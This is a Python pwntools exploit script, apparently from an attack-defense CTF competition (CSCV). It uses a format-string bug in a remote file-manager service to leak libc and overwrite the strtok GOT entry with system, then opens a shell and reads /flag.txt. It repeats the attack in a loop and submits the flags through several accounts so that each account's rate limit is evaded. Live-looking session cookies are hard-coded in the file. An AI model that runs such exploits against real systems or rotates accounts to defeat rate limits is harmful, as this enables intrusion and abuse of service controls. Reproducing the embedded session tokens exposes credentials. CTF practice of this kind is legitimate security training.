#!/usr/bin/env python3
from pwn import *
import requests
import re
import time
from datetime import datetime
import signal
from concurrent.futures import ThreadPoolExecutor, as_completed
import random

# --------------------------------------------------------------------------------
# CONFIG
# --------------------------------------------------------------------------------
BINARY = "./file_manager"
HOST = "35.240.149.115"
PORT = 1337

SUBMIT_URL = "https://ad.cscv.vn/submitflag_API"

# --------------------------------------------------------------------------------
# MULTIPLE AGENTS - THÊM COOKIES CỦA CÁC ACCOUNTS KHÁC Ở ĐÂY!
# --------------------------------------------------------------------------------
AGENTS = [
    # {
    #     'name': 'Agent-1',
    #     'cookies': {
    #         "x_polaris_sid": "C1TwfNoZE5PH|Tp3to8FCz9nN0|Wmfd8LULN",
    #         "x_polaris_cid": "C1Twfnhk6tQ94OumExKhYz2WqOw2Boyzy3UZ",
    #         "session": "2b7ec366-f1f2-4fdf-aac0-6b103ecd61d1.yjc0FmihMytkLedpWn8kSRES8a0",
    #         "x_polaris_sd": "ns7VrAP83ewp7VfBgLXtvB0F68cXBfRLXEyg48cm|4k2mau/dV4qP7aX68Dgq3C6/30Eo2LsxSI61p1Kasj7vgAkIWCkQ8mcxO4s4F6B8dNmxJYg453tLCnB4dA1W2l!"
    #     }
    # },
   # THÊM AGENTS Ở ĐÂY (cần login từ nhiều browsers/devices khác nhau)
    # {
    #     'name': 'Agent-2',
    #     'cookies': {
    #         "x_polaris_sid": "C1ThICdO5t1vzkJrcPpW8Hk5RbKU9EoF6Ld1",
    #         "x_polaris_cid": "C1RwzpVUNcQnW6DOSG|mffk9rDpd|pucMLJ9",
    #         "session": "4678aac7-0945-471d-aa67-9271a4e42f5f.7hQCLPLOYqsHusn6qQ0oGJdQM3U",
    #         "x_polaris_sd": "j09SDHppx3Cci5LKob29bv2hzlCSs6f46e0nSu52Yoiz8xMyFCobzT4bQe60fnYutSAnCURWNwTm8/930uKXoflqbiPXgLLEsdJBrrlPYHuJfBmzhBTbQ1P22p17ZS4PRZ/!"
    #     }
    # },
    {
        'name': 'Agent-3',
        'cookies': {
            "x_polaris_sid": "C1ThICdO5t1vzkJrcPpW8Hk5RbKU9EoF6Ld1",
            "x_polaris_cid": "C1RwzpVUNcQnW6DOSG|mffk9rDpd|pucMLJ9",
            "session": "d9359e62-7a45-429a-bc1c-1eaec050aef5.viWA_4emUB3vPXq11-l3Gbkf27A",
            "x_polaris_sd": "LZfLlYdxbxzSuuYj1szATUYc/0GKi|O|ILp8hdw1QLCqsCAq9q/RfGBJdND/HM2n5hMvMckQB3g9tGs4uMRvmKRXZgpjKoOneJ/IbbYeHEicVdjrskEHBP83WS1cwCEXop7!"
        }
    },
]

TEAM = "MTA.ADC"
DAEMON = "Pwn01"

# MULTI-AGENT CONFIG
CHECK_INTERVAL = 1
SUBMITS_PER_FLAG = 7    # Số lần submit cho mỗi flag
AGENT_COOLDOWN = 5          # Cooldown khi agent bị rate limit
TIMEOUT = 5

# --------------------------------------------------------------------------------
# EXPLOIT SETUP
# --------------------------------------------------------------------------------
context.binary = exe = ELF(BINARY, checksec=False)
context.log_level = "error"
context.timeout = 1
libc = exe.libc

submitted_flags = set()

# Track agent states
agent_states = {}
for agent in AGENTS:
    agent_states[agent['name']] = {
        'rate_limited_until': 0,
        'total_submits': 0,
        'successful_submits': 0,
        'rate_limits': 0
    }

class TimeoutException(Exception):
    pass

def timeout_handler(signum, frame):
    raise TimeoutException()

def get_flag_fast():
    """Fast exploit"""
    p = None
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(TIMEOUT)
    
    try:
        p = remote(HOST, PORT, level='error')

        def q(s): p.sendline(s)
        def r(): p.recvuntil(b"> ", timeout=0.8)
        
        username = f"h{int(time.time()*1000000)%1000000}".encode()
        q(b"register")
        p.sendlineafter(b"Username: ", username, timeout=0.8)
        p.sendlineafter(b"Password: ", b"123", timeout=0.8)
        r()
        q(b"login")
        p.sendlineafter(b"Username: ", username, timeout=0.8)
        p.sendlineafter(b"Password: ", b"123", timeout=0.8)
        r()

        q(b"write leak.txt")
        p.sendlineafter(b"Enter content as hex string", b"%15$p".hex().encode(), timeout=0.8)
        r()
        q(b"cat leak.txt")
        out = p.recvuntil(b"> ", timeout=0.8)
        
        m = re.search(rb"0x[0-9a-fA-F]+", out)
        if not m:
            signal.alarm(0)
            p.close()
            return None

        libc.address = int(m.group(0), 16) - 0x601b3
        payload = fmtstr_payload(6, {exe.got["strtok"]: libc.symbols["system"]}, write_size="short")
        
        q(b"write pwn.txt")
        p.sendlineafter(b"Enter content as hex string", payload.hex().encode(), timeout=0.8)
        r()
        q(b"cat pwn.txt")
        r()

        q(b"/bin/sh")
        time.sleep(0.15)
        p.sendline(b"cat /flag.txt")
        response = p.recv(1024, timeout=1.5)
        
        for line in response.decode(errors='ignore').split('\n'):
            line = line.strip()
            if line and (line.startswith('CSCV') or '{' in line):
                signal.alarm(0)
                p.close()
                return line
        
        signal.alarm(0)
        p.close()
        return None

    except:
        signal.alarm(0)
        if p: p.close()
        return None

def get_available_agent():
    """Lấy agent khả dụng (không bị rate limit)"""
    now = time.time()
    available = [
        agent for agent in AGENTS 
        if agent_states[agent['name']]['rate_limited_until'] < now
    ]
    
    if not available:
        # Tất cả bị rate limit, chọn agent sắp hết cooldown
        return min(AGENTS, key=lambda a: agent_states[a['name']]['rate_limited_until'])
    
    # Random để phân tải đều
    return random.choice(available)

def submit_with_agent(flag, agent, req_id):
    """Submit với 1 agent cụ thể"""
    agent_name = agent['name']
    state = agent_states[agent_name]
    
    # Check if still in cooldown
    if time.time() < state['rate_limited_until']:
        return {
            'id': req_id,
            'agent': agent_name,
            'success': False,
            'alert': 'Agent in cooldown',
            'rate_limited': True
        }
    
    try:
        r = requests.post(
            SUBMIT_URL,
            data={"team": TEAM, "daemon": DAEMON, "action": "submit-flag", "flag": flag},
            cookies=agent['cookies'],
            headers={"Origin": "https://ad.cscv.vn", "Referer": "https://ad.cscv.vn/final"},
            allow_redirects=False,
            timeout=2
        )

        state['total_submits'] += 1
        
        alert_match = re.search(r'alert\(["\']([^"\']+)["\']\)', r.text)
        alert = alert_match.group(1) if alert_match else "No response"
        
        success = r.status_code in [200, 302]
        
        # Check rate limit
        rate_limited = False
        if 'rate limit' in alert.lower():
            rate_limited = True
            state['rate_limits'] += 1
            state['rate_limited_until'] = time.time() + AGENT_COOLDOWN
        elif success and 'already' not in alert.lower():
            state['successful_submits'] += 1

        return {
            'id': req_id,
            'agent': agent_name,
            'success': success,
            'alert': alert,
            'rate_limited': rate_limited
        }
        
    except Exception as e:
        return {
            'id': req_id,
            'agent': agent_name,
            'success': False,
            'alert': f"Error: {str(e)}",
            'rate_limited': False
        }

def multi_agent_submit(flag, num_submits=5):
    """
    Submit với multiple agents parallel
    Mỗi agent có rate limit RIÊNG!
    """
    print(f"      ├─ Multi-agent submit ({num_submits}x across {len(AGENTS)} agents)...")
    
    results = []
    
    with ThreadPoolExecutor(max_workers=num_submits) as executor:
        futures = []
        
        for i in range(num_submits):
            # Chọn agent khả dụng cho mỗi request
            agent = get_available_agent()
            future = executor.submit(submit_with_agent, flag, agent, i+1)
            futures.append(future)
        
        # Collect results
        for future in as_completed(futures):
            results.append(future.result())
    
    # Sort by ID
    results.sort(key=lambda x: x['id'])
    
    # Analysis
    by_agent = {}
    accepted_count = 0
    rate_limited_count = 0
    
    for r in results:
        agent_name = r['agent']
        if agent_name not in by_agent:
            by_agent[agent_name] = []
        by_agent[agent_name].append(r)
        
        if r['rate_limited']:
            rate_limited_count += 1
        elif r['success'] and 'already' not in r.get('alert', '').lower():
            accepted_count += 1
    
    # Print summary
    success = sum(1 for r in results if r['success'])
    print(f"      │  └─ {success}/{num_submits} OK", end="")
    
    if accepted_count > 0:
        print(f" | {accepted_count} ACCEPTED ✅", end="")
    if rate_limited_count > 0:
        print(f" | {rate_limited_count} rate limited ⚠️", end="")
    print()
    
    # Print by agent
    print(f"      │")
    for agent_name, agent_results in by_agent.items():
        agent_success = sum(1 for r in agent_results if r['success'])
        agent_rate_limited = sum(1 for r in agent_results if r.get('rate_limited'))
        alerts = {}
        for r in agent_results:
            alert = r.get('alert', 'Unknown')
            alerts[alert] = alerts.get(alert, 0) + 1
        
        print(f"      │  [{agent_name}] {agent_success}/{len(agent_results)} OK", end="")
        if agent_rate_limited > 0:
            print(f" ({agent_rate_limited} rate limited)", end="")
        print()
        
        # Top alert
        if alerts:
            top_alert = max(alerts.items(), key=lambda x: x[1])
            print(f"      │    └─ [{top_alert[1]}x] {top_alert[0]}")
    
    return accepted_count > 0

def print_agent_status():
    """In trạng thái các agents"""
    print(f"      │")
    print(f"      │  Agent Status:")
    now = time.time()
    for agent in AGENTS:
        state = agent_states[agent['name']]
        status = "✅ Ready"
        if state['rate_limited_until'] > now:
            cooldown = int(state['rate_limited_until'] - now)
            status = f"⏸ Cooldown ({cooldown}s)"
        
        print(f"      │  ├─ {agent['name']}: {status} | "
              f"Submits: {state['total_submits']} | "
              f"Accepted: {state['successful_submits']} | "
              f"Rate limits: {state['rate_limits']}")

def main():
    print("=" * 80)
    print(f"[*] MULTI-AGENT Auto Exploit - Team: {TEAM} | Daemon: {DAEMON}")
    print(f"[*] Target: {HOST}:{PORT}")
    print(f"[*] Agents: {len(AGENTS)} configured")
    print(f"[*] Strategy: {SUBMITS_PER_FLAG}x submits per flag using multiple agents")
    print(f"[*] Feature: BYPASS RATE LIMIT - each agent has separate rate limit!")
    print("=" * 80)
    
    if len(AGENTS) == 1:
        print("[!] WARNING: Only 1 agent configured!")
        print("[!] Add more agents in AGENTS list to bypass rate limit effectively")
        print("=" * 80)
    
    checks = 0
    new_flags = 0
    accepted = 0
    last_flag = None
    consecutive_same = 0
    
    try:
        while True:
            checks += 1
            ts = datetime.now().strftime("%H:%M:%S")
            
            print(f"[{ts}] #{checks:3d} ", end="", flush=True)
            
            flag = get_flag_fast()
            
            if not flag:
                print("✗")
                time.sleep(CHECK_INTERVAL)
                continue
            
            if flag == last_flag:
                consecutive_same += 1
                print(f"⊗ (x{consecutive_same})")
                time.sleep(CHECK_INTERVAL)
                continue
            
            # NEW FLAG!
            consecutive_same = 0
            last_flag = flag
            
            print(f"\n  [⚡] NEW: {flag}")
            
            if flag in submitted_flags:
                print(f"      └─ Skip: already submitted before")
                time.sleep(CHECK_INTERVAL)
                continue
            
            # MULTI-AGENT SUBMIT
            is_accepted = multi_agent_submit(flag, SUBMITS_PER_FLAG)
            
            submitted_flags.add(flag)
            new_flags += 1
            if is_accepted:
                accepted += 1
            
            # Print agent status
            print_agent_status()
            
            print(f"      └─ Stats: {accepted} accepted | {new_flags} new | {len(submitted_flags)} unique")
            
            time.sleep(CHECK_INTERVAL)
            
    except KeyboardInterrupt:
        print("\n" + "=" * 80)
        print(f"[!] Summary:")
        print(f"    ├─ Checks: {checks}")
        print(f"    ├─ New Flags: {new_flags}")
        print(f"    ├─ Accepted: {accepted}")
        
        rate = f"{accepted/new_flags*100:.1f}%" if new_flags > 0 else "N/A"
        print(f"    ├─ Success Rate: {rate}")
        print(f"    │")
        print(f"    └─ Agent Performance:")
        for agent in AGENTS:
            state = agent_states[agent['name']]
            print(f"       ├─ {agent['name']}: "
                  f"{state['successful_submits']}/{state['total_submits']} accepted | "
                  f"{state['rate_limits']} rate limits")
        print("=" * 80)

if __name__ == "__main__":
    main()